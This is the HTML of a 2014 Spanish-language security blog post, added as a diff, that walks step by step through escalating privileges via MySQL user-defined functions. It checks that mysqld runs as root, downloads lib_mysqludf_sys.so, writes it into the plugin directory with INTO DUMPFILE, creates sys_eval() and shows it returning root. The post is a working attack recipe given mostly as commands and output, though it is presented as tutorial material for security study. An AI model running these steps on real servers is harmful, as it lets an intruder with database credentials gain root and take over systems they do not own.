@@ -1,0 +1,295 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Mysql UDF Injection [Elevacion De Privilegios] - Security</title>
+  <meta name="author" content="q3rv0">
+
+  
+  <meta name="description" content="Una linda manera de elevar privilegios en un sistema comprometido es aprovechando los permisos con los que corren ciertos demonios en el sistema como &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://q3rv0.github.io/blog/2014/11/23/mysql-udf-injection-elevacion-de-privilegios">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Security" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Security</a></h1>
+  
+    <h2>Follow the white rabbit&#8230;.</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:q3rv0.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Mysql UDF Injection [Elevacion De Privilegios]</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-11-23T01:28:36+06:30'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>23</span><span class='date-suffix'>rd</span>, <span class='date-year'>2014</span></span> <span class='time'>1:28 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>Una linda manera de elevar privilegios en un sistema comprometido es aprovechando los permisos con los que corren ciertos demonios en el sistema como el servidor mysql.
+Hay dos formas de añadir funciones a Mysql y una de ellas es a travez de la interface UDF (funciones definidas por el usuario) para esto habra que contar con la libreria necesaria apartir de la cual seran llamadas. Teniendo los privilegios necesarios podremos crear ciertas funciones como sys_eval() la cual nos permitiran ejecutar comandos como usuario root desde la propia db.</p>
+
+<!--more-->
+
+
+<p>Ante todo debemos asegurarnos de que la base de datos corre con superprivilegios, miremos el fichero de configuracion en /etc/mysql/my.cnf</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># * Basic Settings
+</span><span class='line'>#
+</span><span class='line'>user            = root
+</span><span class='line'>pid-file        = /var/run/mysqld/mysqld.pid
+</span><span class='line'>socket          = /var/run/mysqld/mysqld.sock
+</span><span class='line'>port            = 3306
+</span><span class='line'>basedir         = /usr
+</span><span class='line'>datadir         = /var/lib/mysql
+</span><span class='line'>tmpdir          = /tmp
+</span><span class='line'>language        = /usr/share/mysql/english</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Descargamos la libreria lib_mysqludf_sys.so dentro del directorio /tmp</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>wget https://github.com/mysqludf/lib_mysqludf_sys/raw/master/lib_mysqludf_sys.so
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Conectamos con las credenciales obtenidas a la base de datos</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>mysql -u <span class="s2">&quot;user&quot;</span> -p<span class="s2">&quot;password&quot;</span> database
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Creamos la table code</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='mysql'><span class='line'><span class="k">CREATE</span> <span class="k">TABLE</span> <span class="nf">code</span> <span class="p">(</span><span class="n">codigo</span> <span class="kt">blob</span><span class="p">);</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Presten atencion al tipo de campo “blob” este sirve para almacenar datos binarios entre otros, esto hara que al momento de volcar el fichero no se produzca un cambio de ciertos caracteres que puedan llegar a generar un error cuando la libreria sea llamada.</p>
+
+<p>Insertaremos la libreria en la tabla code</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='mysql'><span class='line'><span class="k">INSERT</span> <span class="k">INTO</span> <span class="n">code</span> <span class="k">VALUES</span><span class="p">(</span><span class="nf">load_file</span><span class="p">(</span><span class="s1">&#39;/tmp/lib_mysqludf_sys.so&#39;</span><span class="p">));</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Dumpeamos los datos en /usr/lib/mysql/plugin/ que es el directorio desde donde el servidor cargara las librerias.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='mysql'><span class='line'><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">code</span> <span class="k">INTO</span> <span class="n">DUMPFILE</span> <span class="s1">&#39;/usr/lib/mysql/plugin/lib_mysqludf_sys.so&#39;</span><span class="p">;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Por ultimo creamos la funcion sys_eval()</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='mysql'><span class='line'><span class="k">CREATE</span> <span class="n">FUNCTION</span> <span class="n">sys_eval</span> <span class="n">RETURNS</span> <span class="n">string</span> <span class="k">SONAME</span> <span class="s1">&#39;lib_mysqludf_sys.so&#39;</span><span class="p">;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Llamamos a  dicha funcion</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='mysql'><span class='line'><span class="k">select</span> <span class="nf">sys_eval</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">);</span>
+</span><span class='line'><span class="o">+-----------------------------------------+</span>
+</span><span class='line'><span class="o">|</span> <span class="nf">sys_eval</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">)</span>                          <span class="o">|</span>
+</span><span class='line'><span class="o">+-----------------------------------------+</span>
+</span><span class='line'><span class="o">|</span> <span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span>
+</span><span class='line'><span class="o">|</span>
+</span><span class='line'><span class="o">+-----------------------------------------+</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Les dejo un video demostrativo que realize en un entorno controlado</p>
+
+<div class="embed-video-container"><iframe src="//www.youtube.com/embed/uaadERGHstk" allowfullscreen></iframe></div>
+
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">q3rv0</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2014-11-23T01:28:36+06:30'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>23</span><span class='date-suffix'>rd</span>, <span class='date-year'>2014</span></span> <span class='time'>1:28 am</span></time>
+      
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://q3rv0.github.io/blog/2014/11/23/mysql-udf-injection-elevacion-de-privilegios/" data-via="q3rv0" data-counturl="http://q3rv0.github.io/blog/2014/11/23/mysql-udf-injection-elevacion-de-privilegios/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2014/11/23/windows-os-evadiendo-las-disable-functions-en-php-con-com/" title="Previous Post: [Windows OS] Evadiendo las disable_functions en php con COM()">&laquo; [Windows OS] Evadiendo las disable_functions en php con COM()</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2014/11/23/lfi-plus-sqli-incluyendo-ficheros-a-travez-de-valores-enteros/" title="Next Post: LFI+SQLI [Incluyendo ficheros a travez de valores enteros]">LFI+SQLI [Incluyendo ficheros a travez de valores enteros] &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2014/11/23/desbordando-el-buffer-en-linux-x86-i/">Desbordando El Buffer en Linux X86 (I)</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/11/23/tomando-el-control-de-una-camara-axis-parte-i/">Tomando El Control De Una Camara AXIS – Parte I</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/11/23/escribiendo-un-auxiliar-para-msf/">Escribiendo Un Auxiliar Para MSF</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/11/23/mysqli-eb-con-extractvalue/">MYSQLI EB Con Extractvalue()</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/11/23/lfi-plus-sqli-incluyendo-ficheros-a-travez-de-valores-enteros/">LFI+SQLI [Incluyendo Ficheros a Travez De Valores Enteros]</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2014 - q3rv0 -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
